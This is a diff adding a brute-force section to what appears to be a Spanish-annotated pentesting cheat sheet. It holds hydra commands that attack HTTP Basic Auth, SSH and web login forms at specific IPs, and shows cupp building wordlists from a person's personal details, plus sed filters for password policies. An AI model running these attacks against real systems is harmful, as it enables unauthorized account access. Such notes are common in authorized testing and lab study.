@@ -126,4 +126,59 @@ nmap 10.9.2.2 -p5000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 
 ```bash
 In GNU sed, the only difference between basic and extended regular expressions is in the behavior of a few special characters: ‘?’, ‘+’, parentheses, braces (‘{}’), and ‘|’.
 ```
+<h2>⭐️ Brute Force </h2>
+
+HTTP Basic Auth
+
+```bash
+hydra -C ftp-betterdefaultpasslist.txt 178.21.3.15 -s 8080 http-get / # La Opcion -C trabaja con listas tipo user:passwd
+```
+HTTP Basic Auth
+
+```bash
+hydra -L list.txt -P rockyou.txt -u -f 178.35.4.13 -s 32 http-get / # L lista variable l user constante igual para la -P y -p
+``` 
+
+SSH Attack
+
+```bash
+hydra -l masa -P rockyou-30.txt -u -f ssh://178.3.4.4:22 -t 4 # Aqui lo que cambia es el servicio para atacar por ejemplo el ftp 
+```
+
+Brute Force Login Forms
+
+```bash
+ hydra -C ftp-betterdefaultpasslist.txt 178.5.4.1 -s 329 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+``` 
+Para encontrar la peticion usar CTRL+C->Network->Seleccionar peticion(click derecho)-> Copy Post...
+Otra opcion es usar el Burpsuite
+
+```bash
+ hydra -C ftp-betterdefaultpasslist.txt 178.5.4.1 -s 329 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'" 
+``` 
+
+<h3>⭐️ Diccionarios</h3>
+
+```bash
+cupp -i # perimite crear diccionarios en base a la informacion de alguien bastante util.
+```
+Ejemplo de Password Policy
+
+8 characters or longer
+contains special characters
+contains numbers
+
+```bash
+sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
+sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
+sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
+```
+
+Generar Usernames
+
+```bash
+usernameGenerator.sh <First Name> <Last Name>
+```
+
+
 
